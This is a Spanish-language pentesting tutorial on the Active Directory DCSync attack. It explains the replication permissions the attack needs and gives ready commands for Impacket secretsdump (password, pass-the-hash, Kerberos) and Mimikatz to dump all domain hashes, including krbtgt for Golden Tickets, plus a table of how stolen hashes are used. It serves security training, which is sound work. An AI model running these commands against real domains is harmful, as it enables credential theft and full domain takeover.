## Abuso de DCSync

El ataque DCSync abusa del protocolo de replicación de Active Directory para simular el comportamiento de un Domain Controller legítimo y solicitar la sincronización de credenciales directamente al DC real — sin necesidad de ejecutar código en él.

Técnicamente, el atacante llama a la función `DsGetNCChanges` del protocolo DRSUAPI, que los DCs usan para replicarse entre sí. El DC objetivo, al recibir una solicitud aparentemente legítima, responde con los hashes de las cuentas solicitadas.

**Permisos necesarios** (sobre el objeto dominio en BloodHound):
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

Por defecto solo los tienen: `Domain Admins`, `Enterprise Admins`, `Administrators` y `Domain Controllers`. Si un usuario no privilegiado aparece con estos permisos en BloodHound, es un vector directo a todos los hashes del dominio.

> ⚠️ Los **Read-Only Domain Controllers (RODC)** no tienen estos permisos y no pueden realizar DCSync.

---

## Desde Linux (externamente — recomendado)

### Con secretsdump (Impacket)

```shell
# Con contraseña — volcar todos los hashes
secretsdump.py '<dominio>/<usuario>:<contraseña>'@<ip_dc>

# Con hash NT (Pass-the-Hash)
secretsdump.py '<dominio>/<usuario>'@<ip_dc> -hashes ':<hash_nt>'

# Volcar solo un usuario específico
secretsdump.py '<dominio>/<usuario>:<contraseña>'@<ip_dc> -just-dc-user <usuario_objetivo>

# Obtener contraseñas en texto claro (si reversible encryption está activa)
secretsdump.py '<dominio>/<usuario>:<contraseña>'@<ip_dc> -just-dc-user <usuario_objetivo> -just-dc-ntlm
```

En Kali, usar el prefijo `impacket-`:

```shell
impacket-secretsdump '<dominio>/<usuario>:<contraseña>'@<ip_dc>
```

### Con autenticación Kerberos (NTLM deshabilitado)

```shell
sudo rdate -n <ip_dc>
getTGT.py <dominio>/<usuario>:<contraseña> -dc-ip <ip_dc>
export KRB5CCNAME=<archivo.ccache>
secretsdump.py '<dominio>/<usuario>'@<maquina>.<dominio> -k -no-pass
```

---

## Desde Windows (internamente)

### Con Mimikatz

```powershell
# Habilitar privilegios de depuración
privilege::debug

# Volcar hash de un usuario específico
lsadump::dcsync /user:<usuario_objetivo>

# Volcar hash de krbtgt (para crear Golden Tickets)
lsadump::dcsync /domain:<dominio> /user:krbtgt

# Volcar todos los hashes del dominio
lsadump::dcsync /domain:<dominio> /all
```

---

## Usos del hash obtenido

| Hash obtenido | Uso |
| ------------- | --- |
| Hash NT de usuario | Pass-the-Hash, crackeado offline |
| Hash NT de `krbtgt` | Creación de Golden Tickets |
| Hash NT de `Administrator` | Acceso directo como administrador |
| Contraseña en texto claro | Acceso directo, reutilización en otros servicios |

> 💡 Si BloodHound muestra que un usuario tiene el edge **DCSync** sobre el dominio, es game over — con ese usuario se pueden volcar todos los hashes del dominio, incluyendo el de `krbtgt` para persistencia total via Golden Ticket.

---

### Referencias

- https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
- https://www.hackingarticles.in/credential-dumping-dcsync-attack/
- https://bloodhound.specterops.io/resources/edges/dc-sync
